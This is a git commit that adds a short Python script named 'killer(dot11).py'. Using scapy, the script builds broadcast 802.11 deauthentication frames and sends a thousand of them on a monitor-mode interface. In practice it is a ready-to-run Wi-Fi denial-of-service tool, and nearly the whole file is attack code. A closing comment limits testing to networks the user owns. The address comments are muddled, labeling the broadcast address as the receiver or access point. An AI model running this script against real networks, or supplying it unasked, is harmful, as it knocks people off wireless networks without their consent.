5e1ae1446d6370c6e32bf26d1b917a92ddf887e3
A. S. <antonsebastian1231@gmail.com>
2026-05-13 05:21:26 +0000

    Create killer(dot11).py

---
+++ killer(dot11).py
@@ -0,0 +1,13 @@
+from scapy.all import *
+
+destination_mac = "ff:ff:ff:ff:ff:ff" #AP/ receiver
+gateway_mac = "paste-your-mac-here" #Attacker
+
+deauthp = Dot11(addr1=destination_mac, addr2=gateway_mac, addr3=gateway_mac)
+
+packet = RadioTap()/deauthp/Dot11Deauth(reason=7)
+
+sendp(packet, inter=0.1, count=1000, iface="wlan0mon", verbose=1)
+
+# Run this is monitor
+# Only test on network setups you own
